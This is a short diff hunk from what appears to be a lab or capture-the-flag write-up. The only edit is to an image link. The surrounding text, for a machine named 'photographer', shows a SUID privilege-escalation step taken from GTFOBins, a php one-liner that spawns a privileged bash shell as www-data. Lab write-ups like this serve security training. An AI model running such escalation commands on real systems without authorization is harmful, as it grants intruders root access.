@@ -382,7 +382,7 @@ We can now use on of these files to escalate our privilege.
 
 Let's go to [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid) to search for an exploit for the `php` utility.
 
-![11](https://github.com/user-attachments/assets/910b21a9-bfea-4a42-a7f5-805e030f4e32)
+![11](https://github.com/user-attachments/assets/910b21a9-bfea-4a42-a7f5-805e030f4e32?raw=1)
 
 ```
 www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
